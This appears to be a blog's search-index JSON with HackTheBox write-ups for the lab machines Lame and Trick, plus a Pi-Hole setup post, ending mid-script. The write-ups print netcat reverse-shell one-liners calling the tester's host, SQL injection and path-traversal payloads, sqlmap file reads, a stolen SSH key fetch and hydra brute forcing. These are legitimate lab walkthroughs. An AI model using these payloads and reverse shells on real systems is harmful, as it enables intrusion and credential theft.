Disk Permissions Comment ---- ----------- ------- print$ NOACCESS PrinterDrivers tmp READ,WRITE ohnoes! opt NOACCESS IPC$ NOACCESS IPCService(lameserver(Samba3.0.20-Debian)) ADMIN$ NOACCESS IPCService(lameserver(Samba3.0.20-Debian)) /tmp - RW TCP/3632NMAPPORT STATE SERVICE REASON VERSION3632/tcp open distccd syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))| distcc-cve2004-2687: | VULNERABLE:| distcc Daemon Command Execution| State: VULNERABLE (Exploitable)| IDs: CVE:CVE-2004-2687| Risk factor: High CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)| Allows executing of arbitrary commands on systems running distccd 3.1 and| earlier. The vulnerability is the consequence of weak service configuration.| | Disclosure date: 2002-02-01| Extra information:| | uid=1(daemon) gid=1(daemon) groups=1(daemon)| | References:| https://distcc.github.io/security.html| https://nvd.nist.gov/vuln/detail/CVE-2004-2687|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687Read data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Aug 16 22:28:52 2022 -- 1 IP address (1 host up) scanned in 18.03 seconds Vulnerable to RCE exploitInitial FootholdTCP/3632 - distcc RCE exploit w/ Metasploit Launch msfconsole Search for distcc and use unix/misc/distcc_exec msf6 use unix/misc/distcc_exec msf6 exploit(unix/misc/distcc_exec) &amp;gt; options Set OPTIONS Set RHOSTS msf6 exploit(unix/misc/distcc_exec) &amp;gt; set RHOSTS $ip RHOSTS =&amp;gt; $ip Set Payload msf6 exploit(unix/misc/distcc_exec) &amp;gt; set payload cmd/unix/reverse Set LHOST msf6 exploit(unix/misc/distcc_exec) &amp;gt; set LHOST 10.10.14.2 LHOST =&amp;gt; 10.10.14.2 Exploit TCP/3632 - distcc RCE exploit w/o Metasploit Google distcc exploit -lame To avoid spoilers Found a github exploit Exploit This shell is limited, stuck in /tmp directory, invoke another reverse shell to obtain a more stable shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.17 4242 &amp;gt;/tmp/f ┌──(root💀kali)-[~/htb/lame] └─# nc -nvlp 4242 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4242 Ncat: Listening on 0.0.0.0:4242 Ncat: Connection from 10.10.10.3. Ncat: Connection from 10.10.10.3:48838. sh: no job control in this shell sh-3.2$ id uid=1(daemon) gid=1(daemon) groups=1(daemon) User Flag daemon@lame:/home$ find . 2&amp;gt;/dev/null | grep user ./makis/user.txt daemon@lame:/home$ cat ./makis/user.txt 0bfd0837e923142a01b6ece77f3d6b97 Privilege EscalationRoot - Via SUID GTFOBin Ran linpeas, found something interesting nmap has a GTFOBins entry Exploit daemon@lame:/tmp$ /usr/bin/nmap --interactive nmap&amp;gt; !rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.17 4444 &amp;gt;/tmp/f Root obtained Root - Via Kernel Exploit Check kernel version daemon@lame:/tmp$ uname -a Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux Linux lame 2.6.24-16-server Vulnerable to 2.6.22 &amp;lt; 3.9 - &#39;Dirty COW&#39; Transfer exploit to target Exploit gcc -pthread dirty.c -o dirty -lcrypt ./dirty SSH w/ firefart:password " }, { "title": "Pi-Hole Setup &amp; Results", "url": "/posts/Pi-Hole/", "categories": "Projects, Raspberry Pi", "tags": "", "date": "2022-08-14 00:00:00 +0800", "snippet": "OverviewAfter the evil-twin project, I continued to root machines on hackthebox/vulnhub and left my raspberry pi to collect dust, recently I randomly thought of my raspberry pi and wanted to put my raspberry pi to its full use again!During my research for my Wi-Fi pentesting project, I stumbled upon pi-hole raspberry pi projects, at that point I thought that it could be really useful for me as I am unable to block ads on my phone/tv, however since it is not related to my project scope, I had to find another project. But now, I can finally try it out!Prerequisite Tools Raspberry Pi Imager PuttyPi-Hole SetupOS Installation Select Raspberry Pi OS Select Settings at Bottom Right, Enable SSH, set username &amp;amp; password Eject SSD Plug SSD into Pi Connect ethernet cable Power on the PiConfigure Static IP address for your Pi Login to your Router’s web interface http://192.168.1.1 http://192.168.1.254. View local device to find out Pi’s assigned IP address SSH w/ your configured credentials View currently defined router routers: 192.168.1.254 View current DNS Server sudo nano /etc/resolv.conf nameserver: 192.168.1.254 Modify dhcpcd.conf to configure our static IP address for your Pi interface &amp;lt;NETWORK&amp;gt; static ip_address=&amp;lt;STATICIP&amp;gt;/24 static routers=&amp;lt;ROUTERIP&amp;gt; static domain_name_servers=&amp;lt;DNSIP&amp;gt; &amp;lt;NETWORK&amp;gt;: wlan0(wireless)/eth0(wired) &amp;lt;STATICIP&amp;gt;: IP Address in the Upper Numbers of your DHCP range [Recommendation] &amp;lt;routers&amp;gt;: Refer to Step 4 &amp;lt;DNSIP&amp;gt;: Refer to step 5 Save the file CTRL + X then Y, followed by ENTER Reboot sudo reboot Source Pi-Hole Installation Proceed to your SSH w/ your configured credentials Install Pi-Hole (one-liner) curl -sSL https://install.pi-hole.net | bash Use the following settings YES - Set static IP using current values Choose your DNS Provider Select 3rd party list, just go with the suggested list On - web admin interface On - web server (lighttpd) On - Log queries 0 - Show everything Done Add additional blocklist Login to http://&amp;lt;Pi IP address&amp;gt;/admin Proceed to Group Management &amp;gt; Adlists Proceed to firebog, copy links that are highlighted in green Paste them in Address, under Add new adlist Click online to update your gravity list, and you’re done! DNS Server If you have the option to set your DNS Server on your router, change it to your Pi’s IP Address Unfortunately my router does not allow me to do so, so I will have to manually set the DNS Server of my devices Results Youtube: Unfortunately, due to how youtube ads works, it does not work for youtube. Streaming sites, it works really well! For e.g., when you click on the play button, an ad pops up and forces you to open another tab and sometimes even redirects you to another application! Or there are so many ads that you cannot even see the panels/video. Demo: " }, { "title": "HackTheBox - Shared", "url": "/posts/Shared/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "exploit/sqli/database-enum", "date": "2022-08-05 00:00:00 +0800", "snippet": "" }, { "title": "HackTheBox - Trick", "url": "/posts/Trick/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "tcp/53-dns, exploit/file-inclusion/lfi, exploit/sqli/auth-bypass", "date": "2022-07-31 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ DNS enumeration, revealing a subdomain preprod-payroll.trick.htb that running a recruitment management system via nginx. The recruitment management system is susceptible to SQLi authentication bypass, allowing us to use SQLMAP’s file-read functionality to read nginx’s sites-enabled configuration file revealing another subdomain preprod-marketing.trick.htb and users on the machine.preprod-marketing.trick.htb is susceptible to local file inclusion allowing us to include michael’s SSH private key, obtaining our initial foothold.On the system, linpeas revealed that there is a directory (/etc/fail2ban/action.d) that michael has write access to, pspy64 revealed that there is a cronjob that replaces fail2ban configuration to its original state every 3 minutes.The directory that michael has write access to contains the ban action that fail2ban executes if a ban is triggered. We can change the ban action (/etc/fail2ban/action.d/ip-tables/multiport.conf) to a reverse shell before the cronjob executes (within 3 minutes) to obtain root. Column Details Box Name Trick IP 10.10.11.166 Points - Difficulty Easy Creator Geiseric Release Date 19-Jun-2022 ReconTCP/25 (SMTP)VRFYHydra v9.2 (c) 2021 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-22 23:27:30[DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task[DATA] attacking smtp-enum://10.10.11.166:25/vrfy[25][smtp-enum] host: 10.10.11.166 login: root[25][smtp-enum] host: 10.10.11.166 login: mysql1 of 1 target successfully completed, 2 valid passwords foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-22 23:27:52 mysql It suggests that there is a MySQL database TCP/UDP/53 (DNS)DNS Reverse Lookup To find out domain name associated with given IP address ┌──(root💀kali)-[~/htb/trick] └─# dig -p 53 -x 10.10.11.166 @10.10.11.166 ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.0-2-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; -p 53 -x 10.10.11.166 @10.10.11.166 ;; global options: +cmd ;; Got answer: ;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 59238 ;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3 ;; WARNING: recursion requested but not available ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ; COOKIE: 1c04a30ff97f1b56b14939d562dae355ed090e175dd1319d (good) ;; QUESTION SECTION: ;166.11.10.10.in-addr.arpa. IN PTR ;; ANSWER SECTION: 166.11.10.10.in-addr.arpa. 604800 IN PTR trick.htb. ;; AUTHORITY SECTION: 11.10.10.in-addr.arpa. 604800 IN NS trick.htb. ;; ADDITIONAL SECTION: trick.htb. 604800 IN A 127.0.0.1 trick.htb. 604800 IN AAAA ::1 ;; Query time: 44 msec ;; SERVER: 10.10.11.166#53(10.10.11.166) (UDP) ;; WHEN: Sat Jul 23 01:50:11 +08 2022 ;; MSG SIZE rcvd: 163 trick.htb NS Lookup To find out nameserver as well ┌──(root💀kali)-[~/htb/trick/source_code] └─# nslookup SERVER 10.10.11.166 Default server: 10.10.11.166 Address: 10.10.11.166#53 10.10.11.166 166.11.10.10.in-addr.arpa name = trick.htb. Zone Transfer To find out more subdomains ┌──(root💀kali)-[~/htb/trick] └─# dig AXFR -p 53 @10.10.11.166 trick.htb ; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.18.0-2-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; AXFR -p 53 @10.10.11.166 trick.htb ; (1 server found) ;; global options: +cmd trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800 trick.htb. 604800 IN NS trick.htb. trick.htb. 604800 IN A 127.0.0.1 trick.htb. 604800 IN AAAA ::1 preprod-payroll.trick.htb. 604800 IN CNAME trick.htb. trick.htb. 604800 IN SOA trick.htb. root.trick.htb. 5 604800 86400 2419200 604800 ;; Query time: 48 msec ;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP) ;; WHEN: Sat Jul 23 01:53:52 +08 2022 ;; XFR size: 6 records (messages 1, bytes 231) preprod-payroll.trick.htb Add it to /etc/hosts TCP/80 (HTTP)FFUF301 GET 7l 12w 185c http://10.10.11.166/assets =&amp;gt; http://10.10.11.166/assets/301 GET 7l 12w 185c http://10.10.11.166/css =&amp;gt; http://10.10.11.166/css/200 GET 83l 475w 5480c http://10.10.11.166/index.html301 GET 7l 12w 185c http://10.10.11.166/js =&amp;gt; http://10.10.11.166/js/Initial FootholdSQLi Auth Bypass Visited fuzzed directories (http://10.10.11.166/FUZZ), could not find any relevant information FUZZ preprod-payroll.trick.htb Visit preprod-payroll.trick.htb ┌──(root💀kali)-[~/htb/trick] └─# ffuf -u http://preprod-payroll.trick.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://preprod-payroll.trick.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ [Status: 302, Size: 9546, Words: 1453, Lines: 267] assets [Status: 301, Size: 185, Words: 6, Lines: 8] database [Status: 301, Size: 185, Words: 6, Lines: 8] index.php [Status: 302, Size: 9546, Words: 1453, Lines: 267] :: Progress: [4615/4615] :: Job [1/1] :: 1127 req/sec :: Duration: [0:00:04] :: Errors: 0 :: database Suggests that there is a database that could be used for login. Proceed to preprod-payroll.trick.htb Attempt SQLi, could not trigger an error w/ &#39; quotes Attempt SQLi Auth Bypass # Payloads or 1=1 or 1=1-- or 1=1# or 1=1/* or 1=1 -- - LFI Vulnerability - 1 After browsing through the Recruitment Management System, found a parameter that is vulnerable to LFI preprod-payroll.trick.htb/index.php?page=&amp;lt;Include a file w/ a php extension&amp;gt; Include files that could contain sensitive information w/ phpfilter, it allows us to encode the page w/ base64 to later decode and view the contents index.php index.php?page=php://filter/convert.base64-encode/resource=index Check if GET parameter $page is set, then include that page, appending .php to it ajax.php admin_class.php db_connect.php remo:TrulyImpossiblePasswordLmao123 Tried to SSH w/ remo:TrulyImpossiblePasswordLmao123, failedSQLi Database Enumeration Instead of bypassing login, enumerate the database Login and intercept w/ burp, save request as sqli.txt Enumerate databases ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit] └─# sqlmap -r sqli.txt --output-dir=$(pwd)/sqlmap -p username --dbs available databases [2]: [*] information_schema [*] payroll_db Enumerate tables in database ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit] └─# sqlmap -r sqli.txt --output-dir=$(pwd)/sqlmap -p username -D payroll_db --tables Database: payroll_db [11 tables] +---------------------+ | position | | allowances | | attendance | | deductions | | department | | employee | | employee_allowances | | employee_deductions | | payroll | | payroll_items | | users | +---------------------+ Enumerate value in users table from payroll_db database ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit] └─# sqlmap -r sqli.txt --output-dir=$(pwd)/sqlmap -p username -D payroll_db -T users --dump Enemigosss:SuperGucciRainbowCake Failed to SSH w/ Enemigosss:SuperGucciRainbowCake Check current user ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit] └─# sqlmap -r sqli.txt --output-dir=$(pwd)/sqlmap --users database management system users [1]: [*] &#39;remo&#39;@&#39;localhost&#39; Check current user SQL privileges ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit] └─# sqlmap -r sqli.txt --output-dir=$(pwd)/sqlmap --privilege --batch database management system users privileges: [*] %remo% [1]: privilege: FILE With FILE privilege, Able to read files we have read access to. Able to write file to directories we have write access to Read /etc/passwd to view users in the machine ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit] └─# sqlmap -r sqli2.txt --output-dir=$(pwd)/sqlmap2 --file-read=/etc/passwd --batch --threads 10 Parameter: username (POST) Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: username=test&#39; AND (SELECT 6658 FROM (SELECT(SLEEP(5)))InNy) AND &#39;ksPl&#39;=&#39;ksPl&amp;amp;password=test [*] starting @ 01:06:43 /2022-07-27/ [*] ending @ 04:36:07 /2022-07-27/ ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit] └─# cat /root/htb/trick/10.10.11.166/exploit/sqlmap2/preprod-payroll.trick.htb/files/_etc_passwd root:$6$78I.phJC$4eZRbAn.9IgixOBB5tlJAMVm90Qwv9T95w0rJIacRGZxTIvZ82JvR4G5pt99gxTly9H8Ryw35MSk5YjXG.XcJ0:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-�ata:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:112:121::/var/lib/saned:/usr/sbin/nologin colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false sshd:x:118:65534::/run/sshd:/usr/sbin/nologin postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin bind:x:120:128::/var/cache/bind:/usr/sbin/nologin michael:x:1001:1001::/home/michael:/bin/bash michael This will take quite long because it is done by time-based blind SQLi There is another SQLi vulnerability at Employees List that is exploited by boolean blind SQLi, allowing us to read the file much quicker Parameter: id (POST) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: id=(SELECT (CASE WHEN (8486=8486) THEN &#39;&#39; ELSE (SELECT 9870 UNION SELECT 4043) END))&amp;amp;firstname=test&amp;amp;middlename=test&amp;amp;lastname=test&amp;amp;department_id=3&amp;amp;position_id=4&amp;amp;salary=123 [*] starting @ 05:09:56 /2022-07-27/ [*] ending @ 05:20:52 /2022-07-27/ Bruteforce SSH ┌──(root💀kali)-[~/htb/trick/10.10.11.166]└─# cat usernames.txt rootmysqlEnemigosssremomichael┌──(root💀kali)-[~/htb/trick/10.10.11.166]└─# cat passwords.txt SuperGucciRainbowCakeTrulyImpossiblePasswordLmao123 ┌──(root💀kali)-[~/htb/trick/10.10.11.166]└─# hydra -L usernames.txt -P passwords.txt ssh://10.10.11.166 -VHydra v9.2 (c) 2021 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-27 05:06:47[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 10 tasks per 1 server, overall 10 tasks, 10 login tries (l:5/p:2), ~1 try per task[DATA] attacking ssh://10.10.11.166:22/[ATTEMPT] target 10.10.11.166 - login &quot;root&quot; - pass &quot;SuperGucciRainbowCake&quot; - 1 of 10 [child 0] (0/0)[ATTEMPT] target 10.10.11.166 - login &quot;root&quot; - pass &quot;TrulyImpossiblePasswordLmao123&quot; - 2 of 10 [child 1] (0/0)[ATTEMPT] target 10.10.11.166 - login &quot;mysql&quot; - pass &quot;SuperGucciRainbowCake&quot; - 3 of 10 [child 2] (0/0)[ATTEMPT] target 10.10.11.166 - login &quot;mysql&quot; - pass &quot;TrulyImpossiblePasswordLmao123&quot; - 4 of 10 [child 3] (0/0)[ATTEMPT] target 10.10.11.166 - login &quot;Enemigosss&quot; - pass &quot;SuperGucciRainbowCake&quot; - 5 of 10 [child 4] (0/0)[ATTEMPT] target 10.10.11.166 - login &quot;Enemigosss&quot; - pass &quot;TrulyImpossiblePasswordLmao123&quot; - 6 of 10 [child 5] (0/0)[ATTEMPT] target 10.10.11.166 - login &quot;remo&quot; - pass &quot;SuperGucciRainbowCake&quot; - 7 of 10 [child 6] (0/0)[ATTEMPT] target 10.10.11.166 - login &quot;remo&quot; - pass &quot;TrulyImpossiblePasswordLmao123&quot; - 8 of 10 [child 7] (0/0)[ATTEMPT] target 10.10.11.166 - login &quot;michael&quot; - pass &quot;SuperGucciRainbowCake&quot; - 9 of 10 [child 8] (0/0)[ATTEMPT] target 10.10.11.166 - login &quot;michael&quot; - pass &quot;TrulyImpossiblePasswordLmao123&quot; - 10 of 10 [child 9] (0/0)1 of 1 target completed, 0 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-07-27 05:06:52 Failed Read up on Nginx Server Blocks Able to host multiple websites on a single server A server block consists of a subset of configurations that define a virtual server Multiple server blocks are possible to decide which block will handle the request based on domain name, IP address and port. Location Blocks Located within server blocks, that determines how request are processed for different URIs and resources https://www.keycdn.com/support/nginx-location-directive What is /etc/nginx/sites-available/* directory It is a place to store configuration files for your website(s) If you wish to enable that website, create a symlink to /etc/nginx/sites-enabled/&amp;lt;website name&amp;gt;, only then it is enabled It is best practice to create a new file for each website/vhost to manage them easier It is best practice to name the file after the website’s FQDN Source What is /etc/nginx/sites-enabled/* directory It contains the configuration details of currently running website, such as Root directory, /var/www/html Server Name, trick.htb, preprod-payroll Directories /assets, /database Read nginx configuration file to find out more details on the webserver ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit]└─# sqlmap -r sqli.txt --output-dir=$(pwd)/sqlmap --file-read=/etc/nginx/nginx.conf --batch --threads 10 [22:35:45] [INFO] retrieving the length of query output[22:35:45] [INFO] retrieved: 4[22:35:45] [INFO] retrieved: 1482 [22:35:45] [INFO] the local file &#39;/root/htb/trick/10.10.11.166/exploit/sqlmap/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf&#39; and the remote file &#39;/etc/nginx/nginx.conf&#39; have the same size (1482 B)files saved to [1]:[*] /root/htb/trick/10.10.11.166/exploit/sqlmap/preprod-payroll.trick.htb/files/_etc_nginx_nginx.conf (same file) /etc/nginx/sites-enabled/* Files in sites-enabled could reveal web directories that we have not discovered yet Could reveal names of other website We have to guess the filename, it is usually named after website’s FQDN or default if the web administrator did not bother to rename it / seperate the configuration based on different vhost/website Check if /etc/nginx/sites-available/default or /etc/nginx/sites-available/default exists by attempting to read it ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit]└─# sqlmap -r sqli.txt --output-dir=$(pwd)/sqlmap --file-read=/etc/nginx/sites-enabled/default --batch --threads 10 [23:24:01] [INFO] retrieving the length of query output[23:24:01] [INFO] retrieved: 4[23:24:02] [INFO] retrieved: 1058 [23:24:02] [INFO] the local file &#39;/root/htb/trick/10.10.11.166/exploit/sqlmap/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default&#39; and the remote file &#39;/etc/nginx/sites-enabled/default&#39; have the same size (1058 B)files saved to [1]:[*] /root/htb/trick/10.10.11.166/exploit/sqlmap/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default (same file) [23:24:02] [INFO] fetched data logged to text files under &#39;/root/htb/trick/10.10.11.166/exploit/sqlmap/preprod-payroll.trick.htb&#39; Add preprod-marketing.trick.htb to /etc/hosts LFI Vulnerability - 2 Proceed to preprod-marketing.trick.htb After browsing through the pages, found GET parameter that could be susceptible to local file inclusion FUZZ file to include ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit] └─# ffuf -u http://preprod-marketing.trick.htb/index.php?page=FUZZ -w /usr/share/wordlists/LFI/file_inclusion_linux.txt -fw 1 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://preprod-marketing.trick.htb/index.php?page=FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/LFI/file_inclusion_linux.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 1 ________________________________________________ ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] ....//....//....//....//....//....//....//etc/passwd [Status: 200, Size: 2351, Words: 28, Lines: 42] :: Progress: [2249/2249] :: Job [1/1] :: 797 req/sec :: Duration: [0:00:02] :: Errors: 0 :: ....//....//....// There is some sort of input sanitization, // &amp;amp; .... two slashes and 4 dots are needed, instead of the usual ../ Earlier, we found out that there is a user called michael, attempt to include his id_rsa private key ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit] └─# curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa &amp;gt; id_rsa;chmod 600 id_rsa % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1823 0 1823 0 0 24376 0 --:--:-- --:--:-- --:--:-- 24635 TCP/22 - SSH SSH w/ michael’s private key ┌──(root💀kali)-[~/htb/trick/10.10.11.166/exploit] └─# ssh michael@trick.htb -i id_rsa Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Sat Jul 30 20:19:33 2022 from 10.10.14.2 michael@trick:~$ Privilege EscalationRoot - Via Fail2Ban Misconfiguration Ran linpeas, found something interesting We have write access to action.d folder because security group has write access michael belongs to the security group Ran pspy64 to sniff processes There is a cronjob running every 3 minutes that deletes configuration files from /etc/fail2ban Google fail2ban privilege escalation guide Guide I followed What is fail2ban How it fail2ban is supposed to work For e.g., sshd is enabled in the jail configuration file (jail.conf, jail.d/*.conf, if someone were to bruteforce SSH logins, the ban action will be triggered (timeout) Exploiting it The ban action configuration (determines what happens if ban is triggered) is located at /etc/fail2ban/action.d/ip-tables/multiport.conf where we have write access. Replace the ban action to a reverse shell/ to create /bin/bash with SUID bit set Then trigger the ban to obtain our root shell In this machine, there is a cronjob that replaces fail2ban configuration every 3 minutes, this means that we have to complete our exploit within 3 minutes otherwise the file (multiport.conf) will be replaced Check if sshd ban is enabled enabled Create a copy of /etc/fail2ban/action.d/ip-tables/multiport.conf michael@trick:/etc/fail2ban/jail.d$ cp /etc/fail2ban/action.d/ip-tables/multiport.conf /tmp/multiport.conf Add our reverse shell to /tmp/multiport.conf Start listener on Kali Create script to replace our malicious file with the actual file michael@trick:/tmp$ cat script.sh rm /etc/fail2ban/action.d/iptables-multiport.conf cp 